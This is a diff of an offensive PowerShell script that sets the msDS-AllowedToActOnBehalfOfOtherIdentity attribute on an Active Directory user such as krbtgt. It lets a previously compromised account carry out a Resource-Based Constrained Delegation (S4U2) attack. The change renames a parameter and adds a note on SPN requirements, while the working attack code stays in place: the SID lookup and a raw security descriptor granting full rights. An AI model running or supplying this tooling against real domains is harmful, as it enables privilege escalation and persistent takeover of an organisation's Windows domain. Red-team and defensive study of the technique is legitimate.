@@ -3,10 +3,10 @@
 #
 # Usage:
 #   PS> . .\Set-PrincipalAllowedToDelegateToAccount.ps1
-#   PS> Set-PrincipalAllowedToDelegateToAccount -TargetUser krbtgt -TargetComputer COMPROMISED$
+#   PS> Set-PrincipalAllowedToDelegateToAccount -TargetUser krbtgt -DelegateFrom COMPROMISED$
 #
-# Will allow for COMPROMISED$ machine account to perform S4U2 constrained delegation by the use
-# of Resource-Based Constrained Delegation flavour attack.
+# Will allow for COMPROMISED$ account to perform S4U2 constrained delegation by the use
+# of Resource-Based Constrained Delegation flavour attack. This account must have any SPN set first.
 #
 # Script for setting "msDS-AllowedToActOnBehalfOfOtherIdentity" property on the user's object, 
 # allowing incoming trust to the previously compromised Machine object, as described 
@@ -31,11 +31,11 @@ function Set-PrincipalAllowedToDelegateToAccount
         [Parameter(Position = 1)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $TargetComputer
+        $DelegateFrom
     )
     
     # translate the identity to a security identifier
-    $IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $TargetComputer).Translate([System.Security.Principal.SecurityIdentifier])).Value
+    $IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $DelegateFrom).Translate([System.Security.Principal.SecurityIdentifier])).Value
 
     # Substitute the security identifier into the raw SDDL
     $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))"
